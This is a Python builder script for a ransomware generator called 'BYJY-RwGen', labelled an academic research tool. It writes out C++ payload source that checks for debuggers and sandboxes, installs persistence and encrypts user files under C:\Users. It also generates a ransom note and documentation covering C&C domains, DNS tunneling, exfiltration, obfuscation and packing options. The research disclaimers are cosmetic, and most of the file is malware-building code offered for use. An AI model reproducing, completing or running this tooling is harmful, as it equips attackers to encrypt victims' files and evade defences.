#!/usr/bin/env python3
"""
BYJY-RwGen Master Builder
Academic Research Tool - Defense Analysis Only
"""

import os
import sys
import json
import argparse
import subprocess
import platform
import shutil
from pathlib import Path

class MasterBuilder:
    def __init__(self):
        self.project_root = Path(__file__).parent
        self.configs_loaded = {}
        
    def load_configs(self):
        """Load all configuration files"""
        config_files = {
            'build': 'build_config.json',
            'c2': 'c2_config.json', 
            'payload': 'payload_config.json'
        }
        
        for name, file in config_files.items():
            config_path = self.project_root / file
            if config_path.exists():
                with open(config_path, 'r') as f:
                    self.configs_loaded[name] = json.load(f)
                print(f"[+] Loaded {name} configuration")
            else:
                print(f"[-] Missing configuration file: {file}")
                return False
        
        # Load Linux config if on Linux
        if platform.system() == "Linux":
            linux_conf = self.project_root / "linux_build.conf"
            if linux_conf.exists():
                self.configs_loaded['linux'] = self.parse_bash_config(linux_conf)
                print("[+] Loaded Linux build configuration")
        
        return True
    
    def parse_bash_config(self, config_file):
        """Parse bash configuration file"""
        config = {}
        with open(config_file, 'r') as f:
            for line in f:
                line = line.strip()
                if line and not line.startswith('#') and '=' in line:
                    key, value = line.split('=', 1)
                    # Remove quotes
                    value = value.strip('"\'')
                    config[key] = value
        return config
    
    def validate_environment(self):
        """Validate build environment"""
        print("[+] Validating build environment...")
        
        required_tools = {
            'Windows': ['cl', 'link', 'signtool'],
            'Linux': ['gcc', 'strip', 'objcopy']
        }
        
        system = platform.system()
        if system in required_tools:
            missing_tools = []
            for tool in required_tools[system]:
                if not shutil.which(tool):
                    missing_tools.append(tool)
            
            if missing_tools:
                print(f"[-] Missing required tools: {', '.join(missing_tools)}")
                return False
        
        # Check Python dependencies
        required_packages = [
            'cryptography', 'pycryptodome', 'dnspython', 
            'requests', 'psutil'
        ]
        
        missing_packages = []
        for package in required_packages:
            try:
                __import__(package)
            except ImportError:
                missing_packages.append(package)
        
        if missing_packages:
            print(f"[-] Missing Python packages: {', '.join(missing_packages)}")
            print(f"[!] Install with: pip install {' '.join(missing_packages)}")
            return False
        
        print("[+] Environment validation passed")
        return True
    
    def create_source_structure(self):
        """Create source code structure"""
        print("[+] Creating source code structure...")
        
        src_dir = self.project_root / "src"
        src_dir.mkdir(exist_ok=True)
        
        # Create main payload source
        main_cpp = src_dir / "main.cpp"
        if not main_cpp.exists():
            with open(main_cpp, 'w') as f:
                f.write(self.generate_main_source())
        
        # Create resource files
        resources_dir = src_dir / "resources"
        resources_dir.mkdir(exist_ok=True)
        
        # Generate ransom note
        ransom_note = resources_dir / "ransom_note.txt"
        with open(ransom_note, 'w') as f:
            f.write(self.generate_ransom_note())
        
        print("[+] Source structure created")
    
    def generate_main_source(self):
        """Generate main payload source code"""
        return '''#include <windows.h>
#include <iostream>
#include <vector>
#include <thread>
#include "file_handler.cpp"
#include "sandbox_detection.cpp"
#include "registry_hook.cpp"

// Anti-debugging inline assembly
__forceinline bool check_debugger() {
    __try {
        __asm {
            mov eax, fs:[0x30]    // PEB
            mov al, [eax + 2]     // BeingDebugged
            test al, al
            jnz detected
        }
        return false;
    detected:
        return true;
    } __except(EXCEPTION_EXECUTE_HANDLER) {
        return true;
    }
}

int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, 
                     LPSTR lpCmdLine, int nCmdShow) {
    
    // Anti-analysis checks
    AdvancedSandboxDetector detector;
    if (detector.isSandboxed()) {
        ExitProcess(0);
    }
    
    if (check_debugger()) {
        ExitProcess(0);
    }
    
    // Initialize encryption
    std::string encryption_key = "CONFIGURED_KEY_FROM_BUILD";
    QuantumFileHandler handler(encryption_key);
    
    // Add target extensions
    std::vector<std::string> extensions = {
        ".txt", ".doc", ".docx", ".pdf", ".jpg", ".png"
        // More extensions from config
    };
    
    for (const auto& ext : extensions) {
        handler.add_extension(ext);
    }
    
    // Install persistence
    GhostPersistence persistence;
    persistence.install(L"payload.exe");
    
    // Find and encrypt files
    auto files = handler.find_target_files("C:\\\\Users");
    handler.process_files(files, true);
    
    // Display ransom note
    MessageBoxA(NULL, 
        "Your files have been encrypted for security research purposes.\\n"
        "This is an academic research tool - DO NOT USE MALICIOUSLY.", 
        "Security Research", MB_OK | MB_ICONWARNING);
    
    return 0;
}'''
    
    def generate_ransom_note(self):
        """Generate ransom note content"""
        c2_config = self.configs_loaded.get('c2', {})
        ransom_config = c2_config.get('ransom_note', {})
        
        return f'''
=== SECURITY RESEARCH NOTIFICATION ===

This system has been used for cybersecurity research purposes.
Files have been encrypted using advanced cryptographic methods.

*** THIS IS FOR ACADEMIC RESEARCH ONLY ***
*** DO NOT USE FOR MALICIOUS PURPOSES ***

Research Contact: {ransom_config.get('contact_email', 'research@university.edu')}
Study ID: DEFENSIVE-CYBER-2024
Institution: Academic Research Facility

If you are seeing this message in a production environment,
please contact your IT security team immediately.

This tool is designed to help security professionals understand
ransomware behavior for defensive purposes only.

=== END RESEARCH NOTIFICATION ===
'''
    
    def build_windows(self):
        """Build Windows payload"""
        print("[+] Building Windows payload...")
        
        from builders.windows_builder import AdvancedWindowsBuilder
        
        builder = AdvancedWindowsBuilder("build_config.json")
        try:
            builder.compile()
            print("[+] Windows build completed successfully")
            return True
        except Exception as e:
            print(f"[-] Windows build failed: {e}")
            return False
    
    def build_linux(self):
        """Build Linux payload"""
        print("[+] Building Linux payload...")
        
        script_path = self.project_root / "builders" / "linux_builder.sh"
        if not script_path.exists():
            print("[-] Linux builder script not found")
            return False
        
        try:
            result = subprocess.run([str(script_path)], 
                                  cwd=self.project_root,
                                  capture_output=True, 
                                  text=True)
            
            if result.returncode == 0:
                print("[+] Linux build completed successfully")
                print(result.stdout)
                return True
            else:
                print(f"[-] Linux build failed: {result.stderr}")
                return False
        except Exception as e:
            print(f"[-] Linux build error: {e}")
            return False
    
    def generate_documentation(self):
        """Generate comprehensive documentation"""
        print("[+] Generating documentation...")
        
        docs_dir = self.project_root / "docs" / "generated"
        docs_dir.mkdir(parents=True, exist_ok=True)
        
        # Generate config documentation
        config_doc = docs_dir / "configuration_guide.md"
        with open(config_doc, 'w') as f:
            f.write(self.generate_config_documentation())
        
        # Generate usage guide
        usage_doc = docs_dir / "usage_guide.md"
        with open(usage_doc, 'w') as f:
            f.write(self.generate_usage_documentation())
        
        print("[+] Documentation generated")
    
    def generate_config_documentation(self):
        """Generate configuration documentation"""
        return '''# BYJY-RwGen Configuration Guide

## Academic Research Configuration

This document explains all configuration options for the BYJY-RwGen
ransomware generator - FOR ACADEMIC RESEARCH PURPOSES ONLY.

## Build Configuration (build_config.json)

### Basic Settings
- `source_dir`: Source code directory (default: "src")
- `output_dir`: Build output directory (default: "dist") 
- `main_executable`: Output executable name
- `target_architecture`: Target architecture (x86, x64)

### Compilation Options
- `compiler_flags`: MSVC/GCC compiler flags
- `linker_flags`: Linker options
- `obfuscation_level`: Code obfuscation (low/medium/high)

### Anti-Analysis Features
- `enable_anti_analysis`: Enable sandbox/debugger detection
- `pack_executable`: Enable executable packing

### Encryption Configuration
- `algorithm`: Encryption algorithm (xchacha20poly1305)
- `key_derivation`: Key derivation function (argon2id)
- `target_extensions`: File extensions to encrypt

## C&C Configuration (c2_config.json)

### Network Settings
- `c2_domain`: Primary command & control domain
- `backup_domains`: Fallback domains
- `dns_servers`: DNS servers for tunneling

### Communication Protocol
- `method`: Communication method (dns_tunneling)
- `chunk_size`: Data chunk size (bytes)
- `poll_interval`: Polling interval (seconds)

### Security Settings
- `encryption_key`: Communication encryption key
- `session.id_length`: Session ID length
- `exfiltration.enabled`: Data exfiltration toggle

## Payload Configuration (payload_config.json)

### Execution Control
- `delay_start`: Startup delay (seconds)
- `check_sandbox`: Enable sandbox detection
- `minimum_ram_gb`: Minimum RAM requirement

### Encryption Settings
- `threads`: Number of encryption threads
- `chunk_size`: File processing chunk size
- `secure_delete_passes`: Secure deletion passes

### Persistence Methods
- `methods`: Persistence mechanisms array
- `service_name`: Windows service name
- `task_name`: Scheduled task name

## Security Notice

This tool is designed exclusively for academic cybersecurity research
and defense development. Any malicious use is strictly prohibited.
'''
    
    def generate_usage_documentation(self):
        """Generate usage documentation"""
        return '''# BYJY-RwGen Usage Guide

## Academic Research Usage Only

WARNING: This tool generates functional ransomware for research purposes.
Use only in isolated, controlled environments for defense research.

## Quick Start

1. Configure the tool:
   ```bash
   python3 master_builder.py --configure
   ```

2. Build for Windows:
   ```bash
   python3 master_builder.py --build windows
   ```

3. Build for Linux:
   ```bash
   python3 master_builder.py --build linux
   ```

## Configuration Steps

### 1. Edit build_config.json
- Set target architecture and compilation options
- Configure obfuscation and anti-analysis settings
- Define target file extensions

### 2. Edit c2_config.json  
- Configure C&C domains (use test domains only)
- Set encryption keys (generate random keys)
- Configure exfiltration settings

### 3. Edit payload_config.json
- Set execution parameters
- Configure encryption settings
- Define persistence mechanisms

## Research Environment Setup

### Isolated Network
- Use completely isolated test network
- No internet connectivity for test systems
- Monitor all network traffic

### Virtual Machines
- Use dedicated VMs for testing
- Regular snapshots for quick recovery
- Isolated from production systems

### Logging and Monitoring
- Enable comprehensive logging
- Monitor file system changes
- Track network communications

## Defense Research Applications

This tool can be used to:
- Test antivirus detection capabilities
- Analyze ransomware behavior patterns
- Develop behavioral detection systems
- Study encryption implementation methods
- Research C&C communication protocols

## Legal and Ethical Considerations

- Use only for legitimate academic research
- Maintain proper institutional approvals
- Follow responsible disclosure practices
- Never deploy on systems without authorization
- Respect all applicable laws and regulations

## Support

For academic research support, contact your institution's
cybersecurity research department.
'''
    
    def run_build(self, targets=None):
        """Run the build process"""
        print("[+] Starting BYJY-RwGen build process...")
        print("[!] Academic Research Tool - Defense Analysis Only")
        
        if not self.load_configs():
            return False
        
        if not self.validate_environment():
            return False
        
        self.create_source_structure()
        
        success = True
        if not targets or 'windows' in targets:
            if platform.system() == "Windows":
                success &= self.build_windows()
            else:
                print("[!] Cross-compilation for Windows not implemented")
        
        if not targets or 'linux' in targets:
            if platform.system() == "Linux":
                success &= self.build_linux()
            else:
                print("[!] Cross-compilation for Linux not implemented")
        
        if success:
            self.generate_documentation()
            print("[+] Build process completed successfully")
            print("[!] Remember: Research purposes only!")
        else:
            print("[-] Build process failed")
        
        return success

def main():
    parser = argparse.ArgumentParser(
        description='BYJY-RwGen Master Builder - Academic Research Tool'
    )
    parser.add_argument('--build', choices=['windows', 'linux', 'both'], 
                       help='Build target platform')
    parser.add_argument('--configure', action='store_true',
                       help='Configure the build system')
    parser.add_argument('--validate', action='store_true',
                       help='Validate environment only')
    
    args = parser.parse_args()
    
    builder = MasterBuilder()
    
    if args.configure:
        print("[+] Configuration files already generated")
        print("[!] Edit the .json files to customize settings")
        return
    
    if args.validate:
        builder.validate_environment()
        return
    
    if args.build:
        targets = [args.build] if args.build != 'both' else ['windows', 'linux']
        builder.run_build(targets)
    else:
        print("[!] Use --help for usage information")

if __name__ == "__main__":
    main()